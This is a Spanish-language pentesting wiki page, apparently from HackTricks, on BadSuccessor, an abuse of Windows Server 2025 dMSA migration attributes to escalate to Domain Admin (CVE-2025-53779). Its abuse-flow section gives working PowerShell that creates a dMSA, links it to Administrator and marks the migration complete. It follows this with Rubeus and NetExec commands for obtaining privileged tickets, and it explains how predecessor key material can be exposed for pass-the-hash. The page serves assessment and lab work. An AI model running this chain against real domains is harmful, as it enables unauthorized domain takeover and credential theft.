# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

**BadSuccessor** abusa del flujo de migración de **delegated Managed Service Account** (**dMSA**) introducido en **Windows Server 2025**. Un dMSA puede vincularse a una cuenta heredada mediante **`msDS-ManagedAccountPrecededByLink`** y moverse a través de los estados de migración almacenados en **`msDS-DelegatedMSAState`**. Si un atacante puede crear un dMSA en una OU con permisos de escritura y controlar esos atributos, el KDC puede emitir tickets para el dMSA controlado por el atacante con el **contexto de autorización de la cuenta vinculada**.<sup>[[2]](#references)</sup>

En la práctica, esto significa que un usuario con pocos privilegios que solo tiene derechos delegados sobre una OU puede crear un nuevo dMSA, apuntarlo a `Administrator`, completar el estado de migración y obtener un TGT cuyo PAC contenga grupos privilegiados como **Domain Admins**.<sup>[[2]](#references)</sup>

## Detalles importantes de la migración de dMSA

- dMSA es una funcionalidad de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` establece la migración en el estado **started**.
- `Complete-ADServiceAccountMigration` establece la migración en el estado **completed**.
- `msDS-DelegatedMSAState = 1` significa que la migración se ha iniciado.
- `msDS-DelegatedMSAState = 2` significa que la migración se ha completado.
- Durante una migración legítima, el dMSA está destinado a reemplazar de forma transparente la cuenta sustituida, por lo que el KDC/LSA conserva el acceso que la cuenta anterior ya tenía.<sup>[[3]](#references)</sup>

Microsoft Learn también señala que, durante la migración, la cuenta original se vincula al dMSA y que el dMSA está destinado a acceder a aquello a lo que podía acceder la cuenta anterior.<sup>[[3]](#references)</sup> Esta es la suposición de seguridad que BadSuccessor aprovecha.<sup>[[2]](#references)</sup>

## Requisitos

1. Un dominio donde exista **dMSA**, lo que significa que el soporte de **Windows Server 2025** está presente en el lado de AD.
2. El atacante puede **crear** objetos `msDS-DelegatedManagedServiceAccount` en alguna OU, o tiene allí derechos equivalentes y amplios para crear objetos secundarios.
3. El atacante puede **escribir** los atributos relevantes del dMSA o controlar completamente el dMSA que acaba de crear.
4. El atacante puede solicitar tickets Kerberos desde un contexto unido al dominio o desde un túnel que tenga acceso a LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Comprobaciones prácticas

La señal más clara para el operador es verificar el nivel del dominio/bosque y confirmar que el entorno ya utiliza la nueva pila de Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Si ves valores como `Windows2025Domain` y `Windows2025Forest`, trata **BadSuccessor / dMSA migration abuse** como una comprobación prioritaria.

También puedes enumerar las OUs con permisos de escritura delegados para la creación de dMSA mediante herramientas públicas:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Flujo de abuso

1. Create un dMSA en una OU donde tengas derechos delegados de create-child.
2. Establece **`msDS-ManagedAccountPrecededByLink`** en el DN de un objetivo privilegiado, como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Establece **`msDS-DelegatedMSAState`** en `2` para marcar la migración como completada.
4. Solicita un TGT para el nuevo dMSA y utiliza el ticket devuelto para acceder a servicios privilegiados.<sup>[[2]](#references)</sup>

Ejemplo de PowerShell:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ejemplos de solicitudes de tickets / herramientas operativas:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Por qué esto es más que una escalada de privilegios

Durante una migración legítima, Windows también necesita que el nuevo dMSA gestione los tickets que se emitieron para la cuenta anterior antes del cutover. Por eso, el material de tickets relacionado con dMSA puede incluir claves **actuales** y **anteriores** en el flujo **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

En una fake migration controlada por un atacante, este comportamiento puede convertir BadSuccessor en:<sup>[[2]](#references)</sup>

- **Escalada de privilegios** mediante la herencia de SIDs de grupos privilegiados en el PAC.
- **Exposición de material de credenciales**, porque el manejo de claves anteriores puede exponer material equivalente al hash NT/RC4 del predecesor en workflows vulnerables.

Esto hace que la técnica sea útil tanto para la toma de control directa del dominio como para operaciones posteriores, como pass-the-hash o un compromiso más amplio de credenciales.

## Notas sobre el estado del parche

El comportamiento original de BadSuccessor **no es solo un problema teórico de la preview de 2025**. Microsoft le asignó **CVE-2025-53779** y publicó una security update en **agosto de 2025**.<sup>[[4]](#references)</sup> Mantén este ataque documentado para:

- **labs / CTFs / ejercicios assume-breach**
- **entornos de Windows Server 2025 sin parchear**
- **validación de delegaciones de OU y exposición de dMSA durante assessments**

No asumas que un dominio de Windows Server 2025 es vulnerable solo porque existe dMSA; verifica el nivel de parche y realiza las pruebas con cuidado.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Referencias

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
